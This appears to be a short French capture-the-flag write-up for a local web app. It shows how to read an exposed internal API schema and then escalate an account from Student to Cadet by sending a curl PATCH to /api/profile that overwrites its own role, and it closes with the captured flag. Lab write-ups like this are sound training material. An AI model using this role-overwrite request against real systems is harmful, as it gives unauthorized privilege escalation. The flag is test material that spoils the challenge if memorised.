
Si on va sur la page "http://localhost:4942/api/users"
Accessible depuis Profile > Level Buddies

On a alors la liste des users, avec leurs grades.

Notre compte a un role Student, et les roles au dessus sont respectivement;
- Cadet
- Staff
- God

Si on va ensuite sur "http://localhost:4942/api/docs-internal"
On obtient le schema API avec les champs modifiablesm les roles valides... etc
On voit cela:

   ```
	"role writable via PATCH /api/profile"
   ```
Et :

   ```
	"flag field accessible via GET /api/grades?student={id}"
   ```

On peut essayer de surcharger notre propre role avec:

   ```
    curl -s -X PATCH http://localhost:4942/api/profile \
     -b "session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ6NHAxY254NDdtZnk1MGYiLCJsb2dpbiI6Impkb2UiLCJyb2xlIjoic3R1ZGVudCIsImV4cCI6MTc5MzY5OTAxN30.sZ4Hsg_ab0Arn6E7sTqurNL2l9h0pFrcbaOaA8e00es" \
     -H "Content-Type: application/json" \
     -d '{"role":"cadet"}'
   ```

Une fois Cadet, dans l'onglet Staff Area > Staff Dashboard on a :

    ```
        FLAG{just_p4tch_y0ur_0wn_r0l3_lol}
    ```